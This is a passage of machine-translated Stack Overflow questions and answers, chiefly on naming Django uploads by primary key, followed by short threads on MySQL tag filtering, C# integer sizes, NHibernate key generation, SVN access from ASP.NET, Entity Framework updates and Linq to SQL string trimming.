maximum recursion depth exceeded while calling a Python object 
```

我假设这是一个无限循环。调用该`save`方法将调用该`get_nzb_filename`方法，该方法将再次调用该`save`方法，依此类推。

我正在使用最新版本的 Django 主干。

如何获取主键以便我可以使用它来保存我上传的文件？

* * *

**更新@muhuk：**

我喜欢你的解决方案。你能帮我实现它吗？我已将代码更新为以下内容，错误为`'File' object has no attribute 'create'`. 也许我在使用你写的断章取义的东西？

```
def create_with_pk(self):
    instance = self.create()
    instance.save()
    return instance

def get_nzb_filename(instance, filename):
    if not instance.pk:
        create_with_pk(instance)
    name_slug = re.sub('[^a-zA-Z0-9]', '-', instance.name).strip('-').lower()
    name_slug = re.sub('[-]+', '-', name_slug)
    return u'files/%s_%s.nzb' % (instance.pk, name_slug)

class File(models.Model):
    nzb = models.FileField(upload_to=get_nzb_filename, blank=True, null=True)
    name = models.CharField(max_length=256) 
```

我不会在我的模型中强制执行必填字段，而是在我的 Form 类中执行此操作。没问题。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-03-16T20:24:14.170

看来您需要先`File`使用空文件字段预先生成模型。然后拿起一个并将其与给定的文件对象一起保存。

您可以拥有这样的自定义管理器方法；

```
def create_with_pk(self):
    instance = self.create()
    instance.save()     # probably this line is unneeded
    return instance 
```

但是，如果您的任何一个字段都是必需的，这将很麻烦。因为您最初创建的是一个空对象，所以您无法在模型级别强制执行必填字段。

### 编辑

`create_with_pk`应该是[自定义管理器方法](http://docs.djangoproject.com/en/dev/topics/db/managers/#adding-extra-manager-methods)，在您的代码中它只是一个常规方法。因此`self`毫无意义。所有这些都通过示例正确[记录](http://docs.djangoproject.com/en/dev/topics/db/managers/)。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-05-15T21:03:44.950

您可以通过设置`upload_to`到临时位置并创建自定义保存方法来做到这一点。

save 方法应该首先调用 super 来生成主键（这会将文件保存到临时位置）。然后您可以使用主键重命名文件并将其移动到正确的位置。再调用一次 super 以保存更改，您就可以开始了！当我遇到这个确切的问题时，这对我很有用。

例如：

```
class File( models.Model ):
    nzb = models.FileField( upload_to='temp' )

    def save( self, *args, **kwargs ):
        # Call save first, to create a primary key
        super( File, self ).save( *args, **kwargs )

        nzb = self.nzb
        if nzb:
            # Create new filename, using primary key and file extension
            oldfile = self.nzb.name
            dot = oldfile.rfind( '.' )
            newfile = str( self.pk ) + oldfile[dot:]

            # Create new file and remove old one
            if newfile != oldfile:
                self.nzb.storage.delete( newfile )
                self.nzb.storage.save( newfile, nzb )
                self.nzb.name = newfile 
                self.nzb.close()
                self.nzb.storage.delete( oldfile )

        # Save again to keep changes
        super( File, self ).save( *args, **kwargs ) 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2011-12-28T11:41:13.073

## 语境

有同样的问题。通过首先保存对象来解决它为当前对象分配一个 id。

## 方法

1.  创建一个自定义的 upload_to 函数
2.  检测对象是否有pk
3.  如果没有，请先保存实例，检索 pk 并将其分配给对象
4.  用它生成你的路径

## 示例工作代码：

```
class Image(models.Model):
    def upload_path(self, filename):
        if not self.pk:
            i = Image.objects.create()
            self.id = self.pk = i.id
        return "my/path/%s" % str(self.id)
    file = models.ImageField(upload_to=upload_path) 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2022-01-24T21:57:10.303

您可以创建 pre_save 和 post_save 信号。当 pk 已创建时，实际文件保存将在 post_save 中。不要忘记在 app.py 中包含信号，以便它们工作。这是一个例子：

```
_UNSAVED_FILE_FIELD = 'unsaved_file'

@receiver(pre_save, sender=File)
def skip_saving_file_field(sender, instance: File, **kwargs):
    if not instance.pk and not hasattr(instance, _UNSAVED_FILE_FIELD):
        setattr(instance, _UNSAVED_FILE_FIELD, instance.image)
        instance.nzb = None

@receiver(post_save, sender=File)
def save_file_field(sender, instance: Icon, created, **kwargs):
    if created and hasattr(instance, _UNSAVED_FILE_FIELD):
        instance.nzb = getattr(instance, _UNSAVED_FILE_FIELD)
        instance.save() 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2022-01-26T19:56:24.453

这里有两种可能的解决方案：

### `id`在插入行之前检索

*为简单起见，我使用 postgresql db，尽管可以为您的 db 后端调整实现。*

默认情况下，django 创建`id`为`bigserial`（或`serial`取决于`DEFAULT_AUTO_FIELD`）。例如，这个模型：

```
class File(models.Model):
    nzb = models.FileField(upload_to=get_nzb_filename)
    name = models.CharField(max_length=256) 
```

生成以下 DDL：

```
CREATE TABLE "example_file" ("id" bigserial NOT NULL PRIMARY KEY, "nzb" varchar(100) NOT NULL, "name" varchar(256) NOT NULL); 
```

没有明确的序列规范。默认情况下，以(在我们的例子中)`bigserial`的形式创建序列名称`tablename_colname_seq``example_file_id_seq`

解决方案是使用以下方法检索此 ID `nextval`：

```
def get_nextval(model, using=None):
    seq_name = f"{model._meta.db_table}_id_seq"
    if using is None:
        using = "default"
    with connections[using].cursor() as cursor:
        cursor.execute("select nextval(%s)", [seq_name])
        return cursor.fetchone()[0] 
```

并在保存模型之前设置它：

```
class File(models.Model):
    # fields definition

    def save(
        self, force_insert=False, force_update=False, using=None, update_fields=None
    ):
        if not self.pk:
            self.pk = get_nextval(self, using=using)
            force_insert = True
        super().save(
            force_insert=force_insert,
            force_update=force_update,
            using=using,
            update_fields=update_fields,
        ) 
```

请注意，我们依赖于`force_insert`行为，因此请务必[阅读文档](https://docs.djangoproject.com/en/4.0/ref/models/instances/#forcing-an-insert-or-update)并使用测试覆盖您的代码：

```
from django.core.files.uploadedfile import SimpleUploadedFile
from django.forms import ModelForm
from django.test import TestCase

from example import models

class FileForm(ModelForm):
    class Meta:
        model = models.File
        fields = (
            "nzb",
            "name",
        )

class FileTest(TestCase):
    def test(self):
        form = FileForm(
            {
                "name": "picture",
            },
            {
                "nzb": SimpleUploadedFile("filename", b"content"),
            },
        )
        self.assertTrue(form.is_valid())
        form.save()

        self.assertEqual(models.File.objects.count(), 1)
        f = models.File.objects.first()
        self.assertRegexpMatches(f.nzb.name, rf"files/{f.pk}_picture(.*)\.nzb") 
```

* * *

### 插入而不用`nzt`实际`nzt`值更新

这个想法是不言自明的——我们基本上会弹出`nzt`对象创建并在我们知道之后再次保存对象`id`：

```
def save(
    self, force_insert=False, force_update=False, using=None, update_fields=None
):
    nzb = None
    if not self.pk:
        nzb = self.nzb
        self.nzb = None

    super().save(
        force_insert=force_insert,
        force_update=force_update,
        using=using,
        update_fields=update_fields,
    )

    if nzb:
        self.nzb = nzb
        super().save(
            force_insert=False,
            force_update=True,
            using=using,
            update_fields=["nzb"],
        ) 
```

测试已更新以检查实际查询：

```
def test(self):
    form = FileForm(
        {
            "name": "picture",
        },
        {
            "nzb": SimpleUploadedFile("filename", b"content"),
        },
    )
    self.assertTrue(form.is_valid())
    with CaptureQueriesContext(connection) as ctx:
        form.save()

    self.assertEqual(models.File.objects.count(), 1)
    f = models.File.objects.first()
    self.assertRegexpMatches(f.nzb.name, rf"files/{f.pk}_picture(.*)\.nzb")

    self.assertEqual(len(ctx.captured_queries), 2)
    insert, update = ctx.captured_queries
    self.assertEqual(
        insert["sql"],
        '''INSERT INTO "example_file" ("nzb", "name") VALUES ('', 'picture') RETURNING "example_file"."id"''',
    )
    self.assertRegexpMatches(
        update["sql"],
        rf"""UPDATE "example_file" SET "nzb" = 'files/{f.pk}_picture(.*)\.nzb' WHERE "example_file"."id" = {f.pk}""",
    ) 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2011-03-23T19:41:58.440

Ty，你有没有理由推出自己的 slugify 过滤器？

Django 带有一个内置的`slugify`过滤器，你可以像这样使用它：

```
from django.template.defaultfilters import slugify

slug = slugify(some_string) 
```

不确定您是否知道它可以使用...

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2022-01-11T23:21:21.243

您可以使用下一个可用的主键 ID：

```
class Document(models.Model):
    def upload_path(self, filename):
        if not self.pk:
            document_next_id = Document.objects.order_by('-id').first().id + 1
            self.id = self.pk = document_next_id
        return "my/path/document-%s" % str(self.pk)
    document = models.FileField(upload_to=upload_path) 
```

* * *

**细节**

我的示例是对[@vinyll 答案](https://stackoverflow.com/a/8655455/8877692)的修改，但是，[Giles 在他的评论中提到](https://stackoverflow.com/questions/651949/django-access-primary-key-in-models-filefieldupload-to-location/8655455#comment23813231_8655455)的问题（正在创建的两个对象）在这里得到了解决。

我知道我的答案并不完美，并且“下一个可用 ID”可能存在问题，例如，当更多用户尝试同时提交多个表单时。[Giles](https://stackoverflow.com/a/16574947/8877692)的答案更强大，我的更简单（无需生成临时文件，然后移动文件并删除它们）。对于更简单的应用程序，这就足够了。

还感谢 Tjorriemorrie 提供了有关[如何获取](https://stackoverflow.com/questions/579957/model-next-available-primary-key/55913212#55913212)对象的下一个可用 ID 的清晰示例。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2022-01-27T03:30:51.557

好吧，我不确定我的答案，但是-

如果可以的话，使用嵌套模型 -

```
class File(models.Model):
    name = models.CharField(max_length=256)

class FileName(models.Model):
    def get_nzb_filename(instance, filename):
        return instance.name
    name = models.ForeignKey(File)
    nzb = models.FileField(upload_to=get_nzb_filename) 
```

在创建方法中 -

```
File_name = validated_data.pop(file_name_data)
file = File.objects.create(validated_data)
F = FileName.objects.create(name=file, **File_name) 
```

# sql - 从与另一个表具有相同关系的表中获取字段

> ID：651955
> 
> 赞同：1
> 
> 时间：2009-03-16T20:04:25.543
> 
> 标签：sql, mysql, join, filter, tags

我会尽力解释我的情况。我正在制作一个网站，您可以在其中通过浏览标签找到主题。那里没有什么奇怪的。不过，我在一些查询方面遇到了棘手的问题。它们对你来说可能很容易，我的大脑因为做了很多工作而变得一团糟：P。

我有表格“主题”和“标签”。它们使用包含 topic_id 和 tag_id 的表 tags_topics 连接。当用户想要找到一个主题时，他们可能首先选择一个标签作为过滤依据，然后将另一个标签添加到过滤器中。然后我进行查询以获取具有两个选定标签的所有主题。他们可能还有其他标签，但他们必须选择这些标签作为过滤依据。要过滤的标签数量不同，但我们总是有一个用户选择的标签列表来过滤。这主要在[从连接表过滤中得到](https://stackoverflow.com/questions/648308/filtering-from-join-table)回答，我选择了多个连接解决方​​案。

现在我需要获取用户可以过滤的标签。因此，如果我们已经定义了 2 个标签的过滤器，我需要获取所有标签，但过滤器中的标签与包含过滤器中所有标签的主题相关联。这可能听起来很奇怪，所以我将举一个实际的例子：P

假设我们有三个主题：网球、健身房和高尔夫。

*   网球有标签：运动、球、球场和球拍
*   健身房有标签：运动，训练和肌肉
*   高尔夫有标签：运动、球、棒和户外

    1.  用户选择标签运动，所以我们显示所有三个网球、健身房和高尔夫，并且我们显示球、球场、球拍、训练、肌肉、棒和外部作为其他可能的过滤器。
    2.  用户现在将球添加到过滤器中。过滤器现在是运动和球类，因此我们显示网球和高尔夫主题，并使用球场、球拍、球杆和室外作为额外的可能过滤器。
    3.  用户现在将球场添加到过滤器中，因此我们将网球和球拍显示为额外的可能过滤器。

我希望我有点道理。顺便说一句，我正在使用 MySQL。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-03-16T20:22:59.587

```
SELECT   topic_id
FROM     topic_tag
WHERE    tag_id = 1
      OR tag_id = 2
      OR tag_id = 3
GROUP BY topic_id
HAVING   COUNT(topic_id) = 3; 
```

上面的查询将获取所有三个 tag_id 为 1、2 和 3 的 topic_id。然后将其用作子查询：

```
SELECT tag_name
FROM   tag
       INNER JOIN topic_tag
ON     tag.tag_id = topic_tag.tag_id
WHERE  topic_id  IN
                     ( SELECT  topic_id
                     FROM     topic_tag
                     WHERE    tag_id = 1
                           OR tag_id = 2
                           OR tag_id = 3
                     GROUP BY topic_id
                     HAVING   COUNT(topic_id) = 3
                     )
   AND
       (
              tag.tag_id <> 1
           OR tag.tag_id <> 2
           OR tag.tag_id <> 3
       ) 
```

我想这就是你要找的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-03-16T20:23:36.823

```
SELECT DISTINCT `tags`.`tag`
FROM `tags`
LEFT JOIN `tags_topics` ON `tags`.`id` = `tags_topics`.`tag_id`
LEFT JOIN `topics` ON `tags_topics`.`topic_id` = `topics`.`id`
LEFT JOIN `tags_topics` AS `tt1` ON `tt1`.`topic_id` = `topics`.`id`
LEFT JOIN `tags` AS `t1` ON `t1`.`id` = `tt1`.`tag_id`
LEFT JOIN `tags_topics` AS `tt2` ON `tt2`.`topic_id` = `topics`.`id`
LEFT JOIN `tags` AS `t2` ON `t2`.`id` = `tt2`.`tag_id`
LEFT JOIN `tags_topics` AS `tt3` ON `tt3`.`topic_id` = `topics`.`id`
LEFT JOIN `tags` AS `t3` ON `t3`.`id` = `tt3`.`tag_id`
WHERE `t1`.`tag` = 'tag1'
AND `t2`.`tag` = 'tag2'
AND `t3`.`tag` = 'tag3'
AND `tags`.`tag` NOT IN ('tag1', 'tag2', 'tag3') 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-16T20:32:02.840

```
Select a.topic_id
  from join_table a
 where exists( select *
                 from join_table b
                where a.tag_id = b.tag_id
                  and b.topic_id = selected_topic )
 group by a.topic_id
 having count(*) = ( select count(*)
                       from join_table c
                      where c.topic_id = selected_topic ) 
```

应该给你一个主题列表，其中包含 selected_topic 的所有标签。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-03-16T20:33:13.837

我想到的通用解决方案，但容易出现拼写错误：

```
 CREATE VIEW shared_tags_count AS
  SELECT topic_to_tag1.topic_id AS topic_id1, topic_to_tag2.topic_id AS topic_id2, COUNT(*) as number
    FROM topic_to_tag as topic_to_tag1
         JOIN topic_to_tag as topic_to_tag2
         ON topic_to_tag1.topic_id <> topic_to_tag2.topic_id
             AND topic_to_tag1.tag_id = topic_to_tag2.tag_id
GROUP BY topic_to_tag1.topic_id, topic_to_tag2.topic_id;

  CREATE VIEW tags_count AS
  SELECT topic_id, COUNT(*) as number
    FROM topic_to_tag
GROUP BY topic_id

CREATE VIEW related_topics AS
SELECT shared_tags_count.topic_id1, shared_tags_count.topic_id2
  FROM shared_tags_count
       JOIN tags_count
         ON topic_id=topic_id1
            AND shared_tags_counts.number = tags_count.number

CREATE VIEW related_tags AS
SELECT related_topics.topic_id1 as topic_id, topic_to_tag.tag_id
  FROM related_topics
       JOIN topic_to_tag
       ON raleted_topics.tag_id2 = topic_to_tag.topic_id 
```

您只需要查询related_tags 视图。

顺便说一句，有趣的挑战。

# c# - x64 上的 sizeof(int)？

> ID：651956
> 
> 赞同：49
> 
> 时间：2009-03-16T20:04:35.763
> 
> 标签：c#, 64-bit, clr, sizeof

当我`sizeof(int)`在我的 C#.NET 项目中执行此操作时，我得到的返回值为 4。我将项目类型设置为 x64，那么为什么它说 4 而不是 8？这是因为我正在运行托管代码吗？

* * *

## 回答 #1

> 赞同：53
> 
> 时间：2009-03-16T20:05:23.717

即使在 64 位机器上，仍然需要 4 个字节的关键字`int`别名。`System.Int32`

* * *

## 回答 #2

> 赞同：45
> 
> 时间：2009-03-16T21:33:44.970

有[多种 64 位数据模型](http://en.wikipedia.org/wiki/64-bit)；Microsoft为 .NET使用[LP64 ：](https://en.wikipedia.org/wiki/64-bit_computing#64-bit_data_models) *long*和指针都是 64 位的（尽管 C 样式的指针只能在 C# 的`unsafe`上下文中使用，或者作为 `IntPtr`不能用于指针算术的值）。将此与 ILP64 进行对比，其中*int*也是 64 位。

因此，在所有平台上，`int`都是 32 位和`long`64 位；您可以在基础类型的名称中看到这一点，`System.Int32`并且`System.Int64`.

* * *

## 回答 #3

> 赞同：28
> 
> 时间：2009-03-16T20:08:05.020

[`int`](https://docs.microsoft.com/en-us/dotnet/csharp/language-reference/builtin-types/integral-numeric-types)表示`Int32`.NET 语言。这样做是为了兼容 32 位和 64 位体系结构。

这是C#[中所有类型的表](https://docs.microsoft.com/en-us/dotnet/csharp/language-reference/builtin-types/built-in-types)以及它们映射到 .NET 的内容。

* * *

## 回答 #4

> 赞同：19
> 
> 时间：2009-03-16T20:14:28.547

An`Int32`在 x86 和 x64 上是 4 个字节。无论哪种情况， An`Int64`都是 8 个字节。C#`int`类型只是`System.Int32`. 在两个运行时环境下相同。唯一会根据运行时环境改变的类型是`IntPtr`：

```
 unsafe
    {
        var size = sizeof(IntPtr); // 4 on x86 bit machines. 8 on x64
    } 
```

* * *

## 回答 #5

> 赞同：14
> 
> 时间：2009-03-16T20:09:53.923

您可能正在考虑`int`指针或`System.IntPtr`. 这将是 x64 上的 8 个字节和 x86 上的 4 个字节。指针的大小表明您的内存有 64 位地址。（`System.IntPtr.Size`在 x64 上 == 8）

无论您是在 x86 还是 x64 上， 的含义`int`仍然是 4 个字节。也就是说，an`int`将始终对应于`System.Int32`。

* * *

## 回答 #6

> 赞同：6
> 
> 时间：2009-03-16T20:08:34.863

记住`int`只是基本类型的编译器别名`Int32`。鉴于应该很明显，为什么`int`64 位平台上只有 32 位。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2013-02-15T16:51:56.180

```
int i;
int size = BitConverter.GetBytes(i).GetLength(0); 
```

[小提琴样本](https://dotnetfiddle.net/lfH5GZ)

# c# - 让数据库在 nhibernate 中选择主键

> ID：651962
> 
> 赞同：1
> 
> 时间：2009-03-16T20:05:54.993
> 
> 标签：c#, .net, nhibernate

我如何简单地允许 MySQL 使用 nhibernate 将主键分配给插入的对象？似乎我想将生成器设置为“身份”类型，但文档指出使用此“..require[s] 两个 SQL 查询来插入新对象”。为什么会这样做？有没有办法让这个功能像正常的插入 sql 语句一样运行？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-03-16T20:16:02.317

它需要两个查询的原因是，在插入行之前，没有定义列的值。因此，它需要在插入后进行选择以获取插入对象的列值。这是非常标准的，我不会让它阻止我使用自动生成的键作为我的主键。另一种选择是预先生成密钥——比如新对象的 GUID，然后再将其持久化到数据库中。在大多数情况下，除非有其他缓解情况，例如必须合并来自自动生成的键可能发生冲突的单独数据库的数据，否则我并没有真正看到这样做的优势。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-03-16T20:23:02.677

有一个明显的优势：让 NHibernate 使用 Guids 或 Hilo 作为 id 生成器将在 NHibernate 中启用一个非常酷的功能：批处理。只需将 NHibernate 配置为使用批处理（例如 1000 条语句），您的插入就会突然变得非常快。

[Fabio 在这里](http://fabiomaulo.blogspot.com/2009/02/nh210-generators-behavior-explained.html)有一篇关于各种可用生成器的帖子- 如果您正在使用 NHibernate（或者如果您知道有人认为 NHibernate 性能不佳），这将非常有用。

# asp.net - 从 ASP.NET 查询 SVN 存储库以获取修订历史记录

> ID：651975
> 
> 赞同：2
> 
> 时间：2009-03-16T20:10:16.887
> 
> 标签：asp.net, svn

我想从 ASP.NET 应用程序中查询我的 SVN 存储库，以列出我的应用程序的前 XX 个最新版本。

最好的方法是什么？针对 svn 命令行应用程序执行 shell 执行命令？或者我可以通过 https 访问它吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-03-16T20:14:26.517

[Collabnet 有一个名为SharpSVN](http://sharpsvn.open.collab.net/)的开源产品；这是一个用于颠覆的 .NET 2.0 客户端 API。

# entity-framework - 使用实体框架更新语句

> ID：651981
> 
> 赞同：8
> 
> 时间：2009-03-16T20:12:28.910
> 
> 标签：entity-framework, executenonquery

一个简单的问题，在更新一个实体时是否可以使用 Entity Framework 实现此查询？

```
update test set value = value + 1 where id = 10 
```

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-12-17T02:27:47.033

使用[实体框架扩展库](https://github.com/loresoft/EntityFramework.Extended)的批量更新功能，如下所示：

```
dbContext.Tests.Update(t => t.Id == 10, t => new Test() { Value = t.Value + 1 }); 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-03-16T20:28:12.070

不是真的在这种形式下没有。

您将必须选择符合您的条件的所有实体，遍历它们并更新它们。

如果您正在寻找可以在数据库中正确执行的操作，因为您的集合可能很大，您将不得不直接使用 SQL。（我不记得 EF 是否有办法像 Linq To SQL 那样直接执行 UPDATE 查询）。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-03-16T20:16:58.353

应该是，一般情况下它会受到更多的限制。

```
var myEntity = context.First(item => item.id == 10);
myEntity.value += 1;
context.SaveChanges(); 
```

应该生成类似的 SQL，您可以观察分析器以查看实际生成的 SQL，但它应该与您的语句非常相似。

# c# - 如何使用 Linq to Sql 修剪值？

> ID：651982
> 
> 赞同：8
> 
> 时间：2009-03-16T20:13:18.830
> 
> 标签：c#, linq-to-sql

在数据库中，我有一个名为 Contact 的表。名字和其他此类字符串字段旨在使用 Char 数据类型（不是我的数据库设计）。我的对象 Contact 映射到属性中的字符串类型。如果我想做一个通过 id 检索联系人对象的简单测试，我会这样做：

```
Contact contact = db.Contacts.Single(c => c.Id == myId);
Contact test = new Contact();
test.FirstName = "Martin";

Assert.AreEqual(test.FirstName, contact.FirstName); 
```

由于 char 类型，contact.FirstName 值为“Martin”。加载 FirstName 属性时在哪里可以截获它？OnFirstNameChanging(string value) 不会在初始负载（接触）上调用，但会在测试对象上调用。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-03-16T20:50:44.840

也许你可以把它放在 OnLoaded() 部分方法中？注意：我从未使用过它，但我认为它看起来像这样：

```
public partial class Contact
{
    partial void OnLoaded()
    {
        FirstName = FirstName.Trim();
    }
} 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2009-03-16T20:18:13.203

如果您无法更改架构，您可能希望将设计器生成的访问器设为私有/受保护，并创建一个公共访问器以在部分类实现中对属性进行前端处理。然后，您可以修剪 get 访问器中的值。

```
public partial class Contact
{

    public string RealFirstName
    {
       get { return this.FirstName.Trim(); }
       set { this.FirstName = value; }
    }

    ...
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-03-16T20:16:48.760

```
Contact contact = db.Contacts.Single(c => c.Id.Trim() == myId); 
```

并检查 LINQ 提供程序是否将其转换为适当的 SQL。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-03-16T20:39:50.903

这取决于您对架构和代码的控制。

如果值是通过调用带有所有参数的构造函数来设置的，则在将它们分配给成员变量时进行修剪等。

如果它们被分配给属性（可能来自示例），请更改 SET 访问器，以便它在那里进行修剪。

但是，如果您在某个时候确实想要前导或尾随空格，则确实存在潜在问题。

如果您无法修改基类代码，请尝试使用分部类，或从该类继承并覆盖那里的属性。

如果你不能这样做，那么我的最后一个建议是编写一个工厂类，你将创建的对象传递给它，它会根据你想要的规则对其进行清理。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-03-16T20:27:57.657

`ForEach`在尝试搜索 Martin 之前，您可以在联系人列表中运行 a 。

```
var contacts = db.Contacts.ForEach(c => c.FirstName = c.FirstName.Trim());
Contact contact = contacts.Single(c => c.Id == myId);
contact.FirstName // = "Martin" 
```

但是如果必须针对多个领域进行，这种方式维护起来并不容易。``***************